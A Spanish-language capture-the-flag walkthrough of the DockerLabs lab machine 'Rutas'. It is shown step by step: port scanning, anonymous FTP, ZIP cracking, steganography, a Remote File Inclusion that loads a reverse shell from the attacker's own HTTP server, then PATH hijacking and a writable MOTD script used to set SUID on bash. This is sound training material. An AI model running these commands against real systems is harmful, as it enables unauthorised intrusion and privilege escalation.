## Introducción

Este documento presenta la resolución completa de la máquina **Rutas**, desarrollada por *firstatack* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone servicios FTP anónimo, SSH y HTTP. Mediante FTP anónimo se obtiene un archivo ZIP que, tras ser crackeado, revela una imagen con datos ocultos mediante esteganografía, extrayendo credenciales que permiten acceder a un sitio web con autenticación básica. En este sitio, se identifica un parámetro vulnerable a **Remote File Inclusion (RFI)**, permitiendo ejecutar una reverse shell como `www-data`.
Una vez dentro, se encadenan múltiples vectores de escalada: PATH hijacking para acceder a `norberto`, decodificación de credenciales para acceder a `maria`, y modificación de archivos MOTD (con permisos 777) para obtener acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Rutas.zip
sudo bash auto_deploy.sh Rutas.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Rutas/{content,exploits,nmap,scripts}
cd Rutas
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **21/tcp** — FTP
* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1766535299/Ports_tcm1er.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p21,22,80 172.17.0.2
```

---

### 1.3 Enumeración FTP

El servicio FTP permite acceso anónimo:

```bash
ftp 172.17.0.2
```

**Archivos encontrados:**
- `hola_disfruta`
- `respeta.zip`

Se descarga `respeta.zip`.

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Crackeo del ZIP

```bash
zip2john respeta.zip > zip_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
```

![John](https://res.cloudinary.com/dewqswzke/image/upload/v1766535293/John_wkezx6.png)

Contraseña: `iloveyou`

### 2.2 Esteganografía

Se descomprime y se obtiene `oculto.txt`:

![Oculto.txt](https://res.cloudinary.com/dewqswzke/image/upload/v1766535297/Oculto.txt_bzpxv4.png)

Se descarga la imagen y se extrae el contenido con `stegseek`:

```bash
stegseek crackpass.jpg /usr/share/wordlists/rockyou.txt
```

![Pass](https://res.cloudinary.com/dewqswzke/image/upload/v1766535298/Pass_pzb4el.png)

Credenciales: `norberto:b4ck1n4ct10n`

### 2.3 Remote File Inclusion (RFI)

Se agrega el dominio `trackedvuln.dl` al `/etc/hosts` y se accede con autenticación básica. Se fuzzea el parámetro `love`:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "http://trackedvuln.dl/index.php?FUZZ=test" \
  -H "Authorization: Basic $(echo -n 'norberto:b4ck1n4ct10n' | base64)" \
  -fw 155
```

![FFUF](https://res.cloudinary.com/dewqswzke/image/upload/v1766535291/Ffuf_nws1lp.png)

Se crea un archivo `shell.php` y se inicia un servidor HTTP:

```bash
python3 -m http.server 80
```

Se ejecuta la reverse shell:

```bash
curl -H "Authorization: Basic $(echo -n 'norberto:b4ck1n4ct10n' | base64)" \
  "http://trackedvuln.dl/index.php?love=http://172.17.0.1/shell.php"
```

![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1766535301/ReverseShell_km4xff.png)

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → norberto

Se verifica que el usuario puede ejecutar `/usr/bin/baner` como `norberto`:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1766535304/Sudo-lWWW-data_hbnupy.png)

El binario usa `head` sin ruta absoluta, permitiendo PATH hijacking:

```bash
echo '/bin/bash' > /tmp/head
chmod +x /tmp/head
export PATH=/tmp:$PATH
sudo -u norberto /usr/bin/baner
```

![Norberto](https://res.cloudinary.com/dewqswzke/image/upload/v1766535297/Norberto_cojszg.png)

### 3.2 De norberto → maria

Se encuentra un archivo con credenciales codificadas en Braille:

```bash
cat .miscredenciales
```

![Mis credenciales](https://res.cloudinary.com/dewqswzke/image/upload/v1766535296/MisCredenciales_okqfmv.png)

Se decodifica y se accede como `maria`:

```bash
su maria
```

### 3.3 De maria → root

Se encuentra el archivo `/etc/update-motd.d/00-header` con permisos 777, ejecutado al conectar por SSH. Se modifica para establecer SUID en `/bin/bash`:

```bash
echo 'chmod u+s /bin/bash' >> /etc/update-motd.d/00-header
```

Se reconecta por SSH y se ejecuta:

```bash
/bin/bash -p
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1766535302/Root_hggiid.png)
